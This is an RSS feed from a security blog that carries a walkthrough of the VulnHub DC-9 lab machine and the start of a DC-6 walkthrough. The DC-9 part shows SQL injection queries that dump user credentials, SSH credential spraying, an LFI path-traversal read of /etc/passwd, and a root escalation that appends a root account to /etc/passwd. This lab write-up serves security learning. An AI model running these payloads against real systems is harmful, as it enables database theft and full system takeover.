<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Linux on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/linux/</link>
    <description>Recent content in Linux on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 02 Jun 2021 01:18:59 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>VulnHub - DC-9</title>
      <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc9/</link>
      <pubDate>Wed, 02 Jun 2021 01:18:59 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-dc9/</guid>
      <description>DC-9 from VulnHub features a website that is vulnerable to SQL injection. Leveraging the SQLi, I&amp;rsquo;m able to dump a bunch of users&#39; credentials. I&amp;rsquo;m able to gain a foothold on the system by spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write on a file system as root.
Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.</description>
      <content:encoded><![CDATA[<p>DC-9 from VulnHub features a website that is vulnerable to SQL injection. Leveraging the SQLi, I&rsquo;m able to dump a bunch of users' credentials. I&rsquo;m able to gain a foothold on the system by spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write on a file system as root.</p>
<p>Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full <code>nmap</code> scan broke that rule. So I exploited this machine in an unintended way by skipping the LFI and port knocking.</p>
<p>Although it may look weird for a writeup, but for the sake of learning, I&rsquo;ll include the intended way (LFI and Port knocking) in the foothold section.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Blind SQL injection</li>
<li>Local file Inclusion</li>
<li>Port knocking</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>Arpscan</li>
<li>SQLMap</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="host-discovery---arp-scan">Host Discovery - arp-scan</h3>
<p><code>192.168.2.102</code> is the target.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ arp-scan --interface eth0 192.168.2.0/24 | tee scans/00-arp-scan
Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
Starting arp-scan 1.9.7 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
192.168.2.2     0a:00:27:00:00:0a       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
192.168.2.1     08:00:27:d9:63:87       PCS Systemtechnik GmbH
192.168.2.102   08:00:27:54:bc:fd       PCS Systemtechnik GmbH

<span style="color:#ae81ff">3</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
Ending arp-scan 1.9.7: <span style="color:#ae81ff">256</span> hosts scanned in 1.986 seconds <span style="color:#f92672">(</span>128.90 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">3</span> responded
</code></pre></div><h3 id="port-scan---nmap">Port Scan - nmap</h3>
<p><code>nmap</code> shows two ports available, 80 (HTTP) and 22 (SSH). SSH port is in filtered state.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ nmap -n -sC -sV -oA scans/10-initial-dc9 <span style="color:#e6db74">&#39;192.168.2.102&#39;</span> -v
<span style="color:#75715e"># Nmap 7.80 scan initiated Thu Apr  8 02:43:51 2021 as: nmap -n -sC -sV -oA scans/10-initial-dc9 -v 192.168.2.102</span>
Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.102
Host is up <span style="color:#f92672">(</span>0.00048s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 08:00:27:54:BC:FD <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
</code></pre></div><p>But, later it turns into open state after a full port scan performed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ nmap -n -p22 192.168.2.102
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-04-08 05:21 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.102
Host is up <span style="color:#f92672">(</span>0.00075s latency<span style="color:#f92672">)</span>.

PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:54:BC:FD <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
</code></pre></div><p>I can confirms it with <code>netcat</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ nc 192.168.2.102 <span style="color:#ae81ff">22</span>
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The home page of this site doesn&rsquo;t provide anything useful.</p>
<p><div class="img-container"><img src="imgs/image-20210408134805695.png" alt="image-20210408134805695"  /></div>
</p>
<p>The Display All Records menu functions to display all user records.</p>
<p><div class="img-container"><img src="imgs/image-20210408134819215.png" alt="image-20210408134819215"  /></div>
</p>
<p>There is a user input on the Search menu</p>
<p><div class="img-container"><img src="imgs/image-20210408134833069.png" alt="image-20210408134833069"  /></div>
</p>
<p>The Manage menu has login function.</p>
<p><div class="img-container"><img src="imgs/image-20210408134853665.png" alt="image-20210408134853665"  /></div>
</p>
<p>From here I can assume that the website uses database.</p>
<h4 id="error-based-sql-injection---detection">Error-based SQL injection - Detection</h4>
<p>There&rsquo;s error-based SQL injection on <code>search.php</code>. The initial detection is simple, when I try put <code>'</code> it gives bug (joke <a href="https://twitter.com/LiveOverflow/status/1313157161007054854">reference</a> ).</p>
<p>I detected the SQLi vulnerability by adding a single quote  ( <code>'</code> ) at the end of user&rsquo;s first name that I want to search.</p>
<p><div class="img-container"><img src="imgs/image-20210602031408130.png" alt="image-20210602031408130"  /></div>
</p>
<p>Based on the search page, you can only input one name (either the first or the last name) and it will return a single record, so without <code>'</code>, the search should return one related result.</p>
<p><div class="img-container"><img src="imgs/image-20210602031344011.png" alt="image-20210602031344011"  /></div>
</p>
<p>But then, if I submit <code>' OR 1=1 -- -'</code>, it returns all the records.</p>
<p><div class="img-container"><img src="imgs/image-20210602030509083.png" alt="image-20210602030509083"  /></div>
</p>
<h4 id="error-based-sql-injection---database-examination">Error-based SQL injection - Database examination</h4>
<p>There are 6 columns available and the data type of each columns is string. The query as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT &#39;</span>a<span style="color:#e6db74">&#39;,&#39;</span>b<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">c</span><span style="color:#e6db74">&#39;,&#39;</span>d<span style="color:#e6db74">&#39;,&#39;</span>e<span style="color:#e6db74">&#39;,&#39;</span>f<span style="color:#e6db74">&#39; -- 
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033329668.png" alt="image-20210602033329668"  /></div>
</p>
<p>I&rsquo;ll pull out some information such as database version, current database, and the available databases using this query:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT @@version, &#39;</span><span style="color:#66d9ef">Current</span> DB:<span style="color:#e6db74">&#39;, database(), group_concat(SCHEMA_NAME),5,6 FROM information_schema.schemata -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033848222.png" alt="image-20210602033848222"  /></div>
</p>
<p>The website uses MariaDB as its database. The database currently in use is <code>Staff</code>. <code>Staff</code> and <code>users</code> are non-default database, so I&rsquo;ll look into their tables.</p>
<p>With the following query, I can get the two tables name from database <code>Staff</code>: <code>StaffDetails</code> and <code>Users</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span>Staff<span style="color:#e6db74">&#39; -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602034617576.png" alt="image-20210602034617576"  /></div>
</p>
<p>I&rsquo;ll get the columns on table <code>StaffDetails</code> with the following query:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(column_name),2,3,4,5,6 FROM information_schema.columns where table_name = &#39;</span>StaffDetails<span style="color:#e6db74">&#39; -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602035249528.png" alt="image-20210602035249528"  /></div>
</p>
<p>With the following query, I can get the contents of the Username and Password columns:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(username, &#39;</span>:<span style="color:#e6db74">&#39;, password),2,3,4,5,6 FROM Users -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602040550090.png" alt="image-20210602040550090"  /></div>
</p>
<p>The password is in md5 format.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ echo 856f5de590ef37314e7c3bdf6f8a66dc | wc -c
<span style="color:#ae81ff">33</span>
</code></pre></div><p>The hash can be cracked online. The credentials is <code>admin:transorbital1</code></p>
<p><div class="img-container"><img src="imgs/image-20210602044447046.png" alt="image-20210602044447046"  /></div>
</p>
<p>On database <code>users</code>,  there is only one table called <code>UserDetails</code>. Here is the query.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;UNION SELECT group_concat(table_name),2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span>users<span style="color:#e6db74">&#39; -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041638341.png" alt="image-20210602041638341"  /></div>
</p>
<p>With the following query, I can get the columns on table <code>UserDetails</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = &#39;</span>UserDetails<span style="color:#e6db74">&#39; -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041745247.png" alt="image-20210602041745247"  /></div>
</p>
<p><code>UserDetails</code> has 6 columns, but I&rsquo;m interested only with the <code>username</code> and the <code>password</code> column, and I&rsquo;ll pull out the their contents with the following query.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(username,&#34;:&#34;,password),2,3,4,5,6 FROM users.UserDetails -- -
</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041822329.png" alt="image-20210602041822329"  /></div>
</p>
<p>That&rsquo;s a lot of credentials. I can sort those creds with <code>sed</code> command by substituting comma with new line.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ echo -n <span style="color:#e6db74">&#39;marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&amp;TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0&#39;</span> | sed -s <span style="color:#e6db74">&#39;s/,/\n/g&#39;</span>
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC&amp;TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-chandlerb-joeyt-janitor">Shell as chandlerb, joeyt, janitor</h3>
<h4 id="ssh-brute-force">SSH Brute-force</h4>
<p>Since the SSH port is open, I tried all the credentials I obtained from SQLi on SSH using <code>crackmapexec</code>. It returned 3 valid logins.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
...
SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> chandlerb:UrAG0D! 
SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> joeyt:Passw0rd 
...
SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> janitor:Ilovepeepee 
...
</code></pre></div><h4 id="intended-lfi-and-port-knocking">(Intended) LFI and Port Knocking</h4>
<p>I discovered an LFI on the website after inspecting its source code</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">chandlerb@dc-9:/var/www/html$ cat manage.php
</code></pre></div><pre><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
	$file = 'contact-info.php';
	$show_errors = $_SESSION['display_errors'];
      if ($show_errors == 'yes') {
         if(file_exists($file)) {
            include($file);
          } else {
          	echo &quot;File does not exist&quot; . &quot;&lt;br /&gt;&quot;;
			$file = $_GET['file']; # LFI vulnerability starts from here
			include('directory/' . $file); # No validation, poc: manage?file=../../../../etc/passwd
         }} else {
          ?&gt;
</code></pre><p>Using LFI is the intended way to gain a foothold before performing brute force.</p>
<blockquote>
<p>Log into the website using <code>admin:transorbital1</code>.</p>
</blockquote>
<p>With LFI I can include  <code>/etc/knockd.conf</code> to read the knocking sequence to open the SSH port.</p>
<p><div class="img-container"><img src="imgs/image-20210602050027114.png" alt="image-20210602050027114"  /></div>
</p>
<p>In case the SSH port is closed, then to open it, I&rsquo;ll need to interact with port 7469,8475,9842 sequentially.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">for</span> i in <span style="color:#ae81ff">7469</span> <span style="color:#ae81ff">8475</span> 9842; <span style="color:#66d9ef">do</span> nc -w1 192.168.2.102 $i; <span style="color:#66d9ef">done</span>;
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210602051747909.png" alt="image-20210602051747909"  /></div>
</p>
<p>To close the port, I&rsquo;ll need to knock in reverse order:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">for</span> i in <span style="color:#ae81ff">9842</span> <span style="color:#ae81ff">8475</span> 7469; <span style="color:#66d9ef">do</span> nc -w1 192.168.2.102 $i; <span style="color:#66d9ef">done</span>;
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210602052201358.png" alt="image-20210602052201358"  /></div>
</p>
<p>Then from here, I should perform SSH brute force.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-fredf">Shell as fredf</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Only user janitor that has one valuable thing in its home dir, and that is a password list.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
</code></pre></div><p>With those new password, I&rsquo;ll perform another brute force using <code>crackmapexec</code>.</p>
<h4 id="ssh-brute-force-1">SSH Brute-force</h4>
<p><code>crackmapexec</code> returns one valid login for <code>fred:B4-Tru3-001</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
...
SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> fredf:B4-Tru3-001 
...
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «dc-9» «192.168.2.103»
$ ssh fredf@192.168.2.102
fredf@192.168.2.102&#39;s password:
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr  8 20:10:42 2021 from 192.168.2.103
fredf@dc-9:~$ id
uid=1003(fredf) gid=1003(fredf) groups=1003(fredf)
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo-privileges---arbitrary-file-write">Sudo privileges - Arbitrary file write</h4>
<p>User fredf has sudo privileges on a custom binary called <code>test</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/home$ sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> fredf on dc-9:
    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin

User fredf may run the following commands on dc-9:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /opt/devstuff/dist/test/test
</code></pre></div><p>I suspect <code>/opt/devstuff/test.py</code> is the actual code of that binary.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/opt/devstuff$ cat test.py 
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>

<span style="color:#f92672">import</span> sys

<span style="color:#66d9ef">if</span> len (sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span> :
    <span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;Usage: python test.py read append&#34;</span>)
    sys<span style="color:#f92672">.</span>exit (<span style="color:#ae81ff">1</span>)

<span style="color:#66d9ef">else</span> :
    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
    output <span style="color:#f92672">=</span> (f<span style="color:#f92672">.</span>read())

    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;a&#34;</span>)
    f<span style="color:#f92672">.</span>write(output)
    f<span style="color:#f92672">.</span>close()
</code></pre></div><p>Let&rsquo;s break it down.</p>
<p>It checks if the arguments are equal to 3. If it doesn&rsquo;t have 3 arguments, it exits.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> len (sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span> :
    <span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;Usage: python test.py read append&#34;</span>)
    sys<span style="color:#f92672">.</span>exit (<span style="color:#ae81ff">1</span>)
</code></pre></div><p>Otherwise, it reads a file specified on argv1 in read mode and store its contents to the variable <code>output</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">else</span> :
    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
    output <span style="color:#f92672">=</span> (f<span style="color:#f92672">.</span>read())
</code></pre></div><p>Then it opens a file specified on argv2 in append mode and it adds the variable <code>output</code>  (the file contents of argv1) to that file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;a&#34;</span>)
    f<span style="color:#f92672">.</span>write(output)
    f<span style="color:#f92672">.</span>close()
</code></pre></div><p>This can be exploited in many ways, and one of them is to add a new root account to <code>/etc/passwd</code>.</p>
<p>First, I&rsquo;ll create a password hash using <code>openssl</code> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ openssl passwd -1 -salt iamf pass123
$1$iamf$lq0NuDAhNy8IFlaFgiRw20
</code></pre></div><p>I&rsquo;ll follow the flat database format of <code>/etc/passwd</code> to create my own user. I&rsquo;ll use the field property of root user, and substitute the password (<code>x</code> field) and the username with the one I specified.</p>
<p>Here is what I mean:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># From this</span>
root:x:0:0:root:/root:/bin/bash
<span style="color:#75715e"># To</span>
iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash
</code></pre></div><p>I&rsquo;ll store that to a file called <code>/tmp/passwd</code>.</p>
<p>And now I can just append the content of <code>/tmp/passwd</code> to <code>/etc/passwd</code> using <code>/opt/devstuff/dist/test/test</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd
</code></pre></div><p>I can confirms my account is there (<code>/etc/passwd</code>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">fredf@dc-9:/tmp$ cat /etc/passwd
...
janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash
</code></pre></div><h4 id="su---root">SU - root</h4>
<p>Now I can switch to my account and get a root shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ su iamf
Password: pass123
root@dc-9:/tmp# whoami
</code></pre></div><p>And here is the flag,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@dc-9:/tmp# cd /root/
root@dc-9:~# ls
theflag.txt
root@dc-9:~# cat theflag.txt 


███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
                                                                             
Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks for all the fish.
</code></pre></div><p>That&rsquo;s all, thanks for reading.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
<li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
<li><a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>VulnHub - DC-6</title>
      <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</link>
      <pubDate>Sun, 30 May 2021 21:47:03 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</guid>
      <description>DC-6 starts off by enumerating usernames from a WordPress website. I&amp;rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&amp;rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and nmap which allows me to escalate to other users then straight to root.</description>
      <content:encoded><![CDATA[<p>DC-6 starts off by enumerating usernames from a WordPress website. I&rsquo;m able to gain a set of credentials to log into the admin panel with a brute-force attack. There is a WP Plugin which can be leveraged to gain a foothold on the system. A to-do note containing the user&rsquo;s credentials is discovered while enumerating the home directory. For the root part, there is a sudo privileges on a writable backup script and <code>nmap</code> which allows me to escalate to other users then straight to root.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>WordPress enumeration and plugin exploitation</li>
<li>Exploiting sudo privileges on nmap</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>Arpscan</li>
<li>WPScan</li>
<li>BurpSuite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="host-discovery---arpscan">Host Discovery - arpscan</h3>
<p>Because <code>192.168.2.1</code> and <code>192.168.2.2</code> are virtual gateway addresses, the target machine&rsquo;s IP address is most likely <code>192.168.2.104</code>.</p>
